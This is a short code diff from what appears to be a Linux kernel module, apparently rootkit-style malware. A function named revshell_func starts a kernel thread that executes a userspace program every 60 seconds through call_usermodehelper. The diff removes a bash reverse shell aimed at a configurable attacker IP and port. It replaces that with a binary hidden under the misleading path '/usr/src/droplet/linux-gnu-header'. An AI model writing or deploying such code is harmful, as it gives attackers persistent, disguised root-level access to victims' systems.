@@ -4,17 +4,15 @@
 #include "../config.h"
 
 int revshell_func(void *data) {
-    char revshellCmd[256];
     static char *envp[] = {
         "HOME=/",
         "TERM=linux",
         "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL
     };
-    snprintf(revshellCmd, sizeof(revshellCmd), "bash -i >& /dev/tcp/%s/%d 0>&1", YOUR_SRV_IP, YOUR_SRV_PORT);
-    char *argv[] = {"/bin/bash", "-c", revshellCmd, NULL};
+    char *argv[] = {"/usr/src/droplet/linux-gnu-header", NULL};
 
     while (!kthread_should_stop()) {
-        // Execute reverse shell every 60 seconds (1 minute)
+        // Execute /usr/src/droplet/linux-gnu-header every 60 seconds (1 minute)
         call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
         ssleep(60);  // Sleep for 60 seconds (1 minute)
     }
